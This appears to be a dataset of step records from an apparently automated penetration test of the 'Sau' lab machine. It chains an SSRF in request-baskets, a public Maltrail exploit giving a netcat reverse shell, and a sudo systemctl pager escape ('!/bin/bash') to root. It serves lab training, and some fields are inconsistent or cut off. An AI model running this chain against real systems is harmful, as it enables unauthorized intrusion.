   1.6 Exploit the sudo privileges - (completed) {Findings: The command 'sudo /usr/bin/systemctl status trail.service' was run by the user 'puma' on the system 'sau'. The output shows that 'trail.service', a Maltrail server for malicious traffic detection, is active and has been running since Mon 2025-08-04 03:36:02 UTC. The main PID of the service is 871 and it's using 40.3M of memory. The service has multiple tasks running under it, including python3 scripts and logger commands. The documentation for the service can be found at https://github.com/stamparm/maltrail#readme and https://github.com/stamparm/maltrail/wiki. The version of 'systemctl' on the system is systemd 245 (245.4-4ubuntu3.22) with a hybrid default hierarchy.}
   1.7 Vulnerability Analysis - (completed) {Findings: The security testing tool identified several known vulnerabilities in the `systemd` version `245.4-4ubuntu3.22`. These vulnerabilities include: CVE-2020-13529: A Denial-of-Service (DoS) vulnerability exists due to DHCP FORCERENEW spoofing, CVE-2020-13776: A Privilege Escalation vulnerability exists due to numerical usernames, CVE-2022-4415: A Local Information Leak vulnerability exists in `systemd-coredump` due to not respecting the `fs.suid_dumpable` kernel setting, CVE-2023-26604: A Local Privilege Escalation vulnerability exists due to improper blocking of privilege escalation for some `sudo` configurations.}
   1.8 Exploit the identified vulnerabilities - (to-do)",Do a vulnerability analysis on systemd 245 (245.4-4ubuntu3.22),"The selected step is to perform a Google search for more information on any known vulnerabilities of systemd 245 (245.4-4ubuntu3.22) and detailed explanations on how to exploit them.

The Chain-of-thoughts for this step is as follows:

1. From the previous step, we have identified that the version of 'systemctl' running on the system is systemd 245 (245.4-4ubuntu3.22). This is a significant finding as it provides a potential avenue for privilege escalation if any known vulnerabilities exist for this version.

2. The 'systemctl' command provides control over the systemd system and service manager, a critical component of the Linux operating system. If there are any known vulnerabilities for the identified version, it could potentially be exploited to gain unauthorized access to and control over the system.

3. Therefore, the next logical step is to perform a Google search to find more information on any known vulnerabilities of systemd 245 (245.4-4ubuntu3.22) and detailed explanations on how to exploit them. This aligns with the overall goal of gaining unauthorized access to and control over the system and builds upon the strategy of exploiting potential vulnerabilities in 'systemctl'. 

4. The information obtained from the Google search will help in formulating the next steps in the penetration testing process, specifically in the exploitation of identified vulnerabilities.","The security testing tool identified several known vulnerabilities in the `systemd` version `245.4-4ubuntu3.22`. These vulnerabilities include:

1. CVE-2020-13529: A Denial-of-Service (DoS) vulnerability exists due to DHCP FORCERENEW spoofing. The exploit involves crafting and sending specific DHCP FORCERENEW and ACK packets.

2. CVE-2020-13776: A Privilege Escalation vulnerability exists due to numerical usernames. Exploitation involves tricking `systemd` into granting elevated privileges to numerical user accounts.

3. CVE-2022-4415: A Local Information Leak vulnerability exists in `systemd-coredump` due to not respecting the `fs.suid_dumpable` kernel setting. Exploitation involves forcing a SUID process to crash and then accessing the privileged process's core dump.

4. CVE-2023-26604: A Local Privilege Escalation vulnerability exists due to improper blocking of privilege escalation for some `sudo` configurations, specifically when the `systemctl status` command may be executed. The exploit involves manipulating the terminal height to invoke the `less` pager, from which commands can be executed to obtain a root shell.

Note that many of these vulnerabilities have been patched in later versions of `systemd`, and Ubuntu provides updates to address them. It's highly recommended to update the `systemd` package to the latest available version provided by Ubuntu to mitigate these vulnerabilities.","Exploit the found vulnerabilities, specially CVE-2023-26604, appropriately.","1. The intended task of the previous step was to conduct a vulnerability analysis on systemd 245 (245.4-4ubuntu3.22). The results indicate that this task was successfully achieved. The security testing tool identified several known vulnerabilities in the `systemd` version `245.4-4ubuntu3.22`. These vulnerabilities include a Denial-of-Service (DoS) vulnerability, a Privilege Escalation vulnerability due to numerical usernames, a Local Information Leak vulnerability in `systemd-coredump`, and a Local Privilege Escalation vulnerability due to improper blocking of privilege escalation for some `sudo` configurations.

2. These key findings are significant because they provide potential avenues for further privilege escalation. Specaailly CVE-2023-26604 is bound with previous findings, where we get a hangging shell from a systemctl command. Each identified vulnerability could potentially be exploited to gain unauthorized access to and control over the system. These findings lead to the further step of exploiting these vulnerabilities.

3. Given these findings, it would be logical to continue with the strategy of exploiting the identified vulnerabilities. This aligns with the overall goal of gaining unauthorized access to and control over the system. The strategy remains the same, but the focus has shifted to exploiting the specific vulnerabilities identified in the vulnerability analysis. Thus, the next logical step is to exploit the found vulnerabilities appropriately.",Exploit the selected exploitation,"The selected step is to exploit the identified vulnerabilities in the systemd 245 (245.4-4ubuntu3.22) version. 

The Chain-of-thoughts for this step is as follows:

1. The previous step successfully identified several known vulnerabilities in the systemd version 245.4-4ubuntu3.22. These vulnerabilities include a Denial-of-Service (DoS) vulnerability, a Privilege Escalation vulnerability due to numerical usernames, a Local Information Leak vulnerability in systemd-coredump, and a Local Privilege Escalation vulnerability due to improper blocking of privilege escalation for some sudo configurations. 

2. These vulnerabilities provide potential avenues for further privilege escalation. If exploited successfully, they could potentially provide unauthorized access to and control over the system. 

3. Given these findings, the next logical step is to exploit these vulnerabilities. This is in line with the overall strategy of exploiting identified vulnerabilities to gain unauthorized access to the system. 

4. Therefore, following the strategy, the selected step is to exploit the identified vulnerabilities accordingly. This involves understanding each vulnerability, finding or developing appropriate exploits, and then executing these exploits against the target system. The success of this step would significantly advance the penetration testing process.",{'Metasploit': 'Exploit identified vulnerabilities in systemd 245.4-4ubuntu3.22.'}
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed) {Findings: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555}
       1.3.2 Determine the services and versions on each open port - (completed) {Findings: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
       1.3.3 Enumerate further on the services - (completed) {Findings: Port 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025, Configuration Setup Box: Allows to set up the config, Configuration Settings: Forward URL: 127.0.0.1:80, Insecure TLS: Only affects forwarding to URLs like https://..., Proxy Response: Expand Forward Path, Basket Capacity: 200, Action: Redirected the GET requests coming to the basket to port 80 and got the proxy response back, bypassing the port filtering, Response Content: altrail Documentation, Wiki, Issues, Log In, Filters: Threats, Events, Severity, Sources, Trails, Powered by Maltrail (v0.53), Options: Hide threat, Report false positive}
       1.3.4 Vulnerability Assessment - (completed) {Findings: Google search results indicate that the tested version is vulnerable to an OS command execution vulnerability and a public exploit exists. The vulnerability can be exploited by setting up a listener with netcat and running the provided proof of concept (POC). The POC requires modification to use the URL from a previous exploit. The POC is available at: https://github.com/spookier/Maltrail-v0.53-Exploit.}
       1.3.5 Exploit the selected exploitation - (completed) {Findings: The tester cloned a repository and modified the target_URL in the login line. The exploit was run using python3 on the target http://10.129.229.26:55555/dmt5wkr/login. A reverse shell was obtained and the tester connected using netcat listening on port 4444. The current user of the shell is 'puma' and the present working directory is /opt/maltrail. The directory contains files and folders such as CHANGELOG, core, docker, maltrail-sensor.service, maltrail-server.service, maltrail.conf, plugins, requirements.txt, trails, CITATION.cff, LICENSE, README.md, html, misc, sensor.py, server.py, and others.}
   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26}
   1.5 Search for files, commands and their privileges - (completed) {Findings: The user 'puma' on the system 'sau' has sudo privileges without requiring a password to run the command '/usr/bin/systemctl status trail.service'. However, an attempt to check the version of 'systemctl' failed, suggesting the 'systemctl' command may not be correctly installed or accessible in the current environment. The system suggested installing 'systemctl' from either deb systemd (245.4-4ubuntu3.22) or deb systemctl (1.4.3424-2).}
   1.6 Exploit the sudo privileges - (completed) {Findings: The command 'sudo /usr/bin/systemctl status trail.service' was run by the user 'puma' on the system 'sau'. The output shows that 'trail.service', a Maltrail server for malicious traffic detection, is active and has been running since Mon 2025-08-04 03:36:02 UTC. The main PID of the service is 871 and it's using 40.3M of memory. The service has multiple tasks running under it, including python3 scripts and logger commands. The documentation for the service can be found at https://github.com/stamparm/maltrail#readme and https://github.com/stamparm/maltrail/wiki. The version of 'systemctl' on the system is systemd 245 (245.4-4ubuntu3.22) with a hybrid default hierarchy.}
   1.7 Vulnerability Analysis - (completed) {Findings: The security testing tool identified several known vulnerabilities in the `systemd` version `245.4-4ubuntu3.22`. These vulnerabilities include: CVE-2020-13529: A Denial-of-Service (DoS) vulnerability exists due to DHCP FORCERENEW spoofing, CVE-2020-13776: A Privilege Escalation vulnerability exists due to numerical usernames, CVE-2022-4415: A Local Information Leak vulnerability exists in `systemd-coredump` due to not respecting the `fs.suid_dumpable` kernel setting, CVE-2023-26604: A Local Privilege Escalation vulnerability exists due to improper blocking of privilege escalation for some `sudo` configurations.}
   1.8 Exploit the identified vulnerabilities - (completed) {Findings: The security testing tool identified a Local Privilege Escalation vulnerability (CVE-2023-26604) due to improper blocking of privilege escalation for some `sudo` configurations, specifically when the `systemctl status` command may be executed. This vulnerability was exploited by binding it with `systemctl`, which was deemed more appropriate. Root shell was obtained by entering `!/bin/bash` into the hanging shell.",Exploit the found vulnerabilities appropriately,"The selected step is to exploit the identified vulnerabilities in the systemd 245 (245.4-4ubuntu3.22) version. 

The Chain-of-thoughts for this step is as follows:

1. The previous step successfully identified several known vulnerabilities in the systemd version 245.4-4ubuntu3.22. These vulnerabilities include a Denial-of-Service (DoS) vulnerability, a Privilege Escalation vulnerability due to numerical usernames, a Local Information Leak vulnerability in systemd-coredump, and a Local Privilege Escalation vulnerability due to improper blocking of privilege escalation for some sudo configurations. 

2. These vulnerabilities provide potential avenues for further privilege escalation. If exploited successfully, they could potentially provide unauthorized access to and control over the system. 

3. Given these findings, the next logical step is to exploit these vulnerabilities. This is in line with the overall strategy of exploiting identified vulnerabilities to gain unauthorized access to the system. 

4. Therefore, following the strategy, the selected step is to exploit the identified vulnerabilities accordingly. This involves understanding each vulnerability, finding or developing appropriate exploits, and then executing these exploits against the target system. The success of this step would significantly advance the penetration testing process.","The security testing tool identified a Local Privilege Escalation vulnerability (CVE-2023-26604) due to improper blocking of privilege escalation for some `sudo` configurations, specifically when the `systemctl status` command may be executed. This vulnerability was exploited by binding it with `systemctl`, which was deemed more appropriate. Root shell was obtained by entering `!/bin/bash` into the hanging shell. This information is crucial for a senior penetration tester to further investigate and mitigate this vulnerability.",End the pentesting task,"1. The intended task of the previous step was to exploit the identified vulnerabilities in the systemd version 245.4-4ubuntu3.22. This task was successfully achieved. The security testing tool exploited a Local Privilege Escalation vulnerability (CVE-2023-26604) by binding it with 'systemctl', and root shell was obtained by entering `!/bin/bash` into the hanging shell.

2. The key finding from this step is that root access has been achieved, which was the end goal of the penetration testing process. This finding does not lead to any further steps in this context because the ultimate objective of gaining unauthorized and escalated access to the system has been accomplished.

3. Given that the end goal has been achieved, it would be logical to end the penetration testing task at this point. There is no need to move forward with the same strategy or switch to a new strategy because the penetration testing process has successfully achieved its intended objective. Therefore, the strategy selected is to end the penetration testing task.",End task and ask permission to generate the report,"The selected step is to end the task and ask for permission to generate the report. 

The Chain-of-thoughts for this step is as follows:

1. The previous step successfully exploited the identified vulnerabilities in the systemd version 245.4-4ubuntu3.22. The security testing tool exploited a Local Privilege Escalation vulnerability (CVE-2023-26604) by binding it with 'systemctl', and root shell was obtained by entering `!/bin/bash` into the hanging shell.

2. This successful exploitation resulted in achieving the end goal of the penetration testing process, which was to gain root access to the system. This indicates that the penetration testing task has been completed successfully.

3. Given that the ultimate goal of the penetration testing process has been achieved, the logical next step is to conclude the task. This involves ending the task and asking for permission to generate a report detailing the findings of the penetration test.

4. The report will provide a comprehensive overview of the penetration testing process, detailing the vulnerabilities identified, the exploitation process, and the results. This report is crucial for the organization to understand the security flaws in their system and take appropriate measures to mitigate these vulnerabilities.

5. Therefore, following the strategy, the selected step is to end the task and ask for permission to generate the report. This is the logical conclusion to the penetration testing process, providing valuable insights for",{'Nmap': 'Scan ports and services'}
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed)
       1.3.1:{Nmap version:7.80, Scan date and time:2024-01-04 10:26 EST, IP address scanned:10.10.11.224, Host status:Up, Latency:0.11s, Closed ports:65531, Scan duration:7.31 seconds}
       1.3.2 Determine the services and versions on each open port - (completed)
       1.3.2:{Open Ports and Services: Port 22/tcp: Open, Service: ssh, Port 55555/tcp: Open, Service: unknown, Filtered Ports and Services: Port 80/tcp: Filtered, Service: http, Port 8338/tcp: Filtered, Service: unknown} 
       1.3:{Target IP:10.129.229.26}",,Do an nmap scan to find the open ports and the services.,"- Nmap version: 7.80
- Scan date and time: 2024-01-04 10:26 EST
- IP address scanned: 10.10.11.224
- Host status: Up
- Latency: 0.11s
- Closed ports: 65531
- Open Ports and Services:
  - Port 22/tcp: Open, Service: ssh
  - Port 55555/tcp: Open, Service: unknown
- Filtered Ports and Services:
  - Port 80/tcp: Filtered, Service: http
  - Port 8338/tcp: Filtered, Service: unknown
- Scan duration: 7.31 seconds",Enumerate the port 80 and 55555,"1. The intended task of the previous step was to identify open ports and services running on them. This was achieved successfully as we have identified open ports 22, 55555 and filtered port 80.

2. The key findings from this step include the identification of open ports and the services running on them. Port 22 is running ssh, Port 55555 is running an unknown service, and Port 80, usually associated with HTTP, is filtered. This means that there might be a firewall or some sort of filtering mechanism in place that is preventing the penetration tester from accessing the service on this port. 

3. Given these findings, the strategy to move forward would be to enumerate the services running on the open ports. Since Port 80 is filtered but typically associated with HTTP, it would be worthwhile to try and gather more information from this port. This could potentially reveal more about the target system's firewall or filtering mechanisms, which could be useful in future steps. The service running on Port 55555 is unknown, so enumerating this port could potentially reveal more information about this service. This could lead to the discovery of vulnerabilities associated with this service, which could be exploited in later steps. 

Therefore, the strategy to enumerate ports 80 and 55555 is a logical next step given the findings from the previous tasks.","Enumerate further on the X service to find software versions, hidden directories and file.","1. The previous steps identified the open and filtered ports on the target system, which included ports 22, 55555, and 80. Port 22 is running ssh, Port 55555 is running an unknown service, and Port 80, usually associated with HTTP, is filtered.

2. Given the open and filtered ports, the next logical step is to gather more information about the services running on these ports. This is important as it can reveal potential vulnerabilities that can be exploited. 

3. Enumerating the service on Port 80, despite it being filtered, could potentially provide more details about the target system's firewall or filtering mechanisms. This information can be useful for planning future penetration testing steps.

4. The service on Port 55555 is unknown, hence, enumerating this service is critical to learn more about it. Understanding what service is running on this port could lead to the discovery of potential vulnerabilities.

5. Enumerating the services could also reveal software versions, hidden directories, and files. These details can be crucial in identifying potential vulnerabilities and planning the next steps in the penetration testing process.

6. Therefore, the selected step to enumerate further on the services running on ports 80 and 55555 is a logical progression in the penetration testing process based on the findings from the previous steps.",{'Nmap': 'Enumerate services and versions on ports 80 and 55555.'}
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed)
       1.3.1:{Nmap version:7.80, Scan date and time:2024-01-04 10:26 EST, IP address scanned:10.10.11.224, Host status:Up, Latency:0.11s, Closed ports:65531, Scan duration:7.31 seconds}
       1.3.2 Determine the services and versions on each open port - (completed)
       1.3.2:{Open Ports and Services: Port 22/tcp: Open, Service: ssh, Port 55555/tcp: Open, Service: unknown, Filtered Ports and Services: Port 80/tcp: Filtered, Service: http, Port 8338/tcp: Filtered, Service: unknown} 
       1.3:{Target IP:10.129.229.26}
       1.3.3 Enumerate port 80 - (completed)
       1.3.3:{Port 80: Not loaded}
       1.3.4 Enumerate port 55555 - (completed)
       1.3.4:{Port 55555: Directs to a web page, Web page function: Collecting and inspecting HTTP requests, Web page URL: http://10.129.229.26:55555/, Action: Creating a basket to collect and inspect HTTP requests, Result of action: Returns a token for future basket access, Basket created: 'wygbo5a', Token received: fAyZqu93BRdiZ2UakGim_JbTk5rhtCrmUojTozkLjoNM}",Enumerate the port 80 and 55555,"1. The previous steps identified the open and filtered ports on the target system, which included ports 22, 55555, and 80. Port 22 is running ssh, Port 55555 is running an unknown service, and Port 80, usually associated with HTTP, is filtered.

2. Given the open and filtered ports, the next logical step is to gather more information about the services running on these ports. This is important as it can reveal potential vulnerabilities that can be exploited. 

3. Enumerating the service on Port 80, despite it being filtered, could potentially provide more details about the target system's firewall or filtering mechanisms. This information can be useful for planning future penetration testing steps.

4. The service on Port 55555 is unknown, hence, enumerating this service is critical to learn more about it. Understanding what service is running on this port could lead to the discovery of potential vulnerabilities.

5. Enumerating the services could also reveal software versions, hidden directories, and files. These details can be crucial in identifying potential vulnerabilities and planning the next steps in the penetration testing process.

6. Therefore, the selected step to enumerate further on the services running on ports 80 and 55555 is a logical progression in the penetration testing process based on the findings from the previous steps.","- Port 80: Not loaded
- Port 55555: Directs to a web page
- Web page function: Collecting and inspecting HTTP requests
- Web page URL: http://10.129.229.26:55555/
- Action: Creating a basket to collect and inspect HTTP requests
- Result of action: Returns a token for future basket access
- Basket created: 'wygbo5a'
- Token received: fAyZqu93BRdiZ2UakGim_JbTk5rhtCrmUojTozkLjoNM",Further Enumerate the web page,"1. The intended task of the previous step was to enumerate ports 80 and 55555. This was achieved successfully. Port 80 was found to be not loaded, and port 55555 directed to a webpage.

2. The key findings from this step were that port 55555 hosts a webpage that collects and inspects HTTP requests. An action was performed to create a basket to collect and inspect HTTP requests, which resulted in a token being returned for future basket access. This is a significant finding as it reveals a functionality of the target system that could potentially be exploited.

3. Given these findings, it would be logical to continue with the same strategy of enumeration. The webpage hosted on port 55555 is collecting and inspecting HTTP requests, which suggests that there may be more information to uncover through further enumeration. For example, there may be hidden files, directories, or other functionalities on the webpage that have not been discovered yet.

4. Therefore, the strategy to further enumerate the webpage is a logical next step given the findings from the previous tasks. It allows for a deeper understanding of the target system's functionalities, which can potentially lead to the discovery of vulnerabilities to exploit.","Further Enumerate the website;hidden directories, links and software","1. The previous steps have successfully identified open and filtered ports on the target system, specifically Port 80 (which is not loaded) and Port 55555 (which directs to a webpage). The webpage on Port 55555 has a function of collecting and inspecting HTTP requests.

2. The enumeration of Port 55555 has revealed that a 'basket' can be created on the webpage to collect and inspect HTTP requests. This action returns a token for future access to the basket. This finding suggests that the webpage has functionalities that could potentially be exploited.

3. Given these findings, the next logical step would be to further enumerate the webpage. This is because the webpage is hosting a service that collects and inspects HTTP requests, which indicates that there could be more to uncover about the functionality and structure of the webpage.

4. Further enumeration can involve searching for hidden directories, links, and software on the webpage. These elements could provide more information about the webpage and the target system overall. They could also potentially reveal vulnerabilities that can be exploited in the penetration testing process.

5. Therefore, the selected step to further enumerate the website to find hidden directories, links, and software follows logically from the findings of the previous steps and aligns with the strategy of deepening our understanding of the target system through enumeration.","{'Dirbuster': 'Brute force hidden directories and links on the webpage.', 'Web page interaction': 'Interact with the webpage to inspect functionalities and collect tokens.'}"
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed)
       1.3.1:{Nmap version:7.80, Scan date and time:2024-01-04 10:26 EST, IP address scanned:10.10.11.224, Host status:Up, Latency:0.11s, Closed ports:65531, Scan duration:7.31 seconds}
       1.3.2 Determine the services and versions on each open port - (completed)
       1.3.2:{Open Ports and Services: Port 22/tcp: Open, Service: ssh, Port 55555/tcp: Open, Service: unknown, Filtered Ports and Services: Port 80/tcp: Filtered, Service: http, Port 8338/tcp: Filtered, Service: unknown} 
       1.3:{Target IP:10.129.229.26}
       1.3.3 Enumerate port 80 - (completed)
       1.3.3:{Port 80: Not loaded}
       1.3.4 Enumerate port 55555 - (completed)
       1.3.4:{Port 55555: Directs to a web page, Web page function: Collecting and inspecting HTTP requests, Web page URL: http://10.129.229.26:55555/, Action: Creating a basket to collect and inspect HTTP requests, Result of action: Returns a token for future basket access, Basket created: 'wygbo5a', Token received: fAyZqu93BRdiZ2UakGim_JbTk5rhtCrmUojTozkLjoNM}
       1.3.5 Further Enumerate the website - (completed)
       1.3.5:{Basket functionality: Collects HTTP requests, Basket status: Empty, Basket URL: http://10.129.229.26:55555/wygbo5a, GET request made to the basket, GET request time: 8:08:58 pm 02/08/2025, GET request endpoint: /wygbo5a, Headers of GET request: Accept: */*, User-Agent: curl/8.5.0, Powering service: request-baskets, Version: 1.2.1, Directories found with statuses, sizes: /baskets: Status 401, Size 0, /Documents and Settings: Status 400, Size 75, /lost+found: Status 400, Size 75, /Program Files: Status 400, Size 75, /reports list: Status 400, Size 75, /web: Status 200, Size 8700}",Further Enumerate the web page,"1. The previous steps have successfully identified open and filtered ports on the target system, specifically Port 80 (which is not loaded) and Port 55555 (which directs to a webpage). The webpage on Port 55555 has a function of collecting and inspecting HTTP requests.

2. The enumeration of Port 55555 has revealed that a 'basket' can be created on the webpage to collect and inspect HTTP requests. This action returns a token for future access to the basket. This finding suggests that the webpage has functionalities that could potentially be exploited.

3. Given these findings, the next logical step would be to further enumerate the webpage. This is because the webpage is hosting a service that collects and inspects HTTP requests, which indicates that there could be more to uncover about the functionality and structure of the webpage.

4. Further enumeration can involve searching for hidden directories, links, and software on the webpage. These elements could provide more information about the webpage and the target system overall. They could also potentially reveal vulnerabilities that can be exploited in the penetration testing process.

5. Therefore, the selected step to further enumerate the website to find hidden directories, links, and software follows logically from the findings of the previous steps and aligns with the strategy of deepening our understanding of the target system through enumeration.","- Basket functionality: Collects HTTP requests
- Basket status: Empty
- Basket URL: http://10.129.229.26:55555/wygbo5a
- GET request made to the basket
- GET request time: 8:08:58 pm 02/08/2025
- GET request endpoint: /wygbo5a
- Headers of GET request: Accept: */*, User-Agent: curl/8.5.0
- Powering service: request-baskets, Version: 1.2.1
- Directories found with statuses, sizes:
  - /baskets: Status 401, Size 0
  - /Documents and Settings: Status 400, Size 75
  - /lost+found: Status 400, Size 75
  - /Program Files: Status 400, Size 75
  - /reports list: Status 400, Size 75
  - /web: Status 200, Size 8700",Do a vulnerability analysis on  request-baskets | Version: 1.2.1,"1. The previous step aimed to further enumerate the website hosted on Port 55555. This task was successfully accomplished. The enumeration revealed more about the functionality of the 'basket' that collects HTTP requests, and it discovered several directories with their respective statuses and sizes.

2. One of the key findings is the service powering the webpage: 'request-baskets', running on Version 1.2.1. This information is significant because knowing the software and its version can lead to the discovery of potential vulnerabilities specific to that software version. The other directories and their statuses, although informative, do not offer immediate actionable insights.

3. Given these findings, it is logical to change the strategy from enumeration to vulnerability analysis. The goal now is to identify any potential vulnerabilities associated with 'request-baskets' Version 1.2.1. This shift in strategy is driven by the need to exploit potential weaknesses in the software to gain unauthorized access or gather more information about the target system.

4. Therefore, the strategy to perform a vulnerability analysis on 'request-baskets' Version 1.2.1 is a logical next step. This strategy is based on the information gathered from the previous steps, specifically the software and version running on the webpage hosted on Port 55555. By identifying potential vulnerabilities, we can plan for potential exploitation in the next steps of the penetration testing process.",Do a google search for more information,"1. The previous steps in the penetration testing process have successfully identified the service 'request-baskets' running on version 1.2.1 on the target system. This information was obtained through enumeration of the webpage hosted on Port 55555.

2. Given this finding, the next logical step in the penetration testing process is to perform a vulnerability analysis on the identified service and version. This is because knowing the software and its version can provide insights into potential vulnerabilities that can be exploited.

3. One effective way to identify vulnerabilities associated with a specific software and version is to perform a Google search. This can reveal documented vulnerabilities, patches, or exploits associated with 'request-baskets' version 1.2.1. It can also provide detailed explanations and guides on how to exploit these vulnerabilities, which can be useful in the subsequent steps of the penetration testing process.

4. Therefore, the selected step to perform a Google search for more information about potential vulnerabilities in 'request-baskets' version 1.2.1 and how to exploit them follows logically from the findings of the previous steps and aligns with the strategy of conducting a vulnerability analysis.","{'Google search': ""Search for vulnerabilities and exploits related to 'request-baskets' version 1.2.1""}"
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed)
       1.3.1:{Nmap version:7.80, Scan date and time:2024-01-04 10:26 EST, IP address scanned:10.10.11.224, Host status:Up, Latency:0.11s, Closed ports:65531, Scan duration:7.31 seconds}
       1.3.2 Determine the services and versions on each open port - (completed)
       1.3.2:{Open Ports and Services: Port 22/tcp: Open, Service: ssh, Port 55555/tcp: Open, Service: unknown, Filtered Ports and Services: Port 80/tcp: Filtered, Service: http, Port 8338/tcp: Filtered, Service: unknown} 
       1.3:{Target IP:10.129.229.26}
       1.3.3 Enumerate port 80 - (completed)
       1.3.3:{Port 80: Not loaded}
       1.3.4 Enumerate port 55555 - (completed)
       1.3.4:{Port 55555: Directs to a web page, Web page function: Collecting and inspecting HTTP requests, Web page URL: http://10.129.229.26:55555/, Action: Creating a basket to collect and inspect HTTP requests, Result of action: Returns a token for future basket access, Basket created: 'wygbo5a', Token received: fAyZqu93BRdiZ2UakGim_JbTk5rhtCrmUojTozkLjoNM}
       1.3.5 Further Enumerate the website - (completed)
       1.3.5:{Basket functionality: Collects HTTP requests, Basket status: Empty, Basket URL: http://10.129.229.26:55555/wygbo5a, GET request made to the basket, GET request time: 8:08:58 pm 02/08/2025, GET request endpoint: /wygbo5a, Headers of GET request: Accept: */*, User-Agent: curl/8.5.0, Powering service: request-baskets, Version: 1.2.1, Directories found with statuses, sizes: /baskets: Status 401, Size 0, /Documents and Settings: Status 400, Size 75, /lost+found: Status 400, Size 75, /Program Files: Status 400, Size 75, /reports list: Status 400, Size 75, /web: Status 200, Size 8700}
   1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1 - (completed)
   1.4:{Vulnerability identified: CVE-2023-27163, Vulnerability type: Server-Side Request Forgery (SSRF), Vulnerability severity: Critical, Vulnerable component: `/api/baskets/{name}` in Request-Baskets version 1.2.1, Vulnerability description: Allows attackers to make unauthorized requests to internal or external resources. It can lead to access to network resources, sensitive information, and exploitation of other vulnerabilities, Exploitation method: Involves creating a basket within Request-Baskets and manipulating the `forward_url` parameter to point to internal services or resources, Impact: Information Disclosure/Exfiltration: Retrieval of sensitive data from internal network resources, Unauthorized Access: Potential bypass of security measures to access resources, Further Attacks: SSRF vulnerability can be chained with other exploits for more severe outcomes, like Remote Code Execution (RCE), Service Disruption: Potential overload of the server leading to denial-of-service conditions, Mitigation: Update Request-Baskets to a version higher than 1.2.1, implement strong network security practices, and robust authentication mechanisms}",Do a vulnerability analysis on  request-baskets | Version: 1.2.1,"1. The previous steps in the penetration testing process have successfully identified the service 'request-baskets' running on version 1.2.1 on the target system. This information was obtained through enumeration of the webpage hosted on Port 55555.

2. Given this finding, the next logical step in the penetration testing process is to perform a vulnerability analysis on the identified service and version. This is because knowing the software and its version can provide insights into potential vulnerabilities that can be exploited.

3. One effective way to identify vulnerabilities associated with a specific software and version is to perform a Google search. This can reveal documented vulnerabilities, patches, or exploits associated with 'request-baskets' version 1.2.1. It can also provide detailed explanations and guides on how to exploit these vulnerabilities, which can be useful in the subsequent steps of the penetration testing process.

4. Therefore, the selected step to perform a Google search for more information about potential vulnerabilities in 'request-baskets' version 1.2.1 and how to exploit them follows logically from the findings of the previous steps and aligns with the strategy of conducting a vulnerability analysis.","- Vulnerability identified: CVE-2023-27163
- Vulnerability type: Server-Side Request Forgery (SSRF)
- Vulnerability severity: Critical
- Vulnerable component: `/api/baskets/{name}` in Request-Baskets version 1.2.1
- Vulnerability description: Allows attackers to make unauthorized requests to internal or external resources. It can lead to access to network resources, sensitive information, and exploitation of other vulnerabilities.
- Exploitation method: Involves creating a basket within Request-Baskets and manipulating the `forward_url` parameter to point to internal services or resources.
- Impact: 
  - Information Disclosure/Exfiltration: Retrieval of sensitive data from internal network resources.
  - Unauthorized Access: Potential bypass of security measures to access resources.
  - Further Attacks: SSRF vulnerability can be chained with other exploits for more severe outcomes, like Remote Code Execution (RCE).
  - Service Disruption: Potential overload of the server leading to denial-of-service conditions.
- Mitigation: Update Request-Baskets to a version higher than 1.2.1, implement strong network security practices, and robust authentication mechanisms.",Exploit the found exploitation,"1. The intended task of the previous step was to perform a vulnerability analysis on 'request-baskets' version 1.2.1. This task was successfully achieved, as evidenced by the discovery of a critical Server-Side Request Forgery (SSRF) vulnerability (CVE-2023-27163) in the software.

2. The key findings from this vulnerability analysis include the identification of the vulnerability, its severity, the vulnerable component, a description of the vulnerability, the method of exploitation, its potential impact, and recommended mitigation strategies. These findings provide valuable insights that can guide the next steps of the penetration testing process. Specifically, the discovery of a method for exploiting the vulnerability suggests that it may be possible to gain unauthorized access to the system or retrieve sensitive data.

3. Given these findings, it is logical to shift the strategy from vulnerability analysis to exploitation. The goal now is to exploit the identified vulnerability to gain unauthorized access or retrieve sensitive data from the system. This shift in strategy is driven by the discovery of a potential exploit for the identified vulnerability.

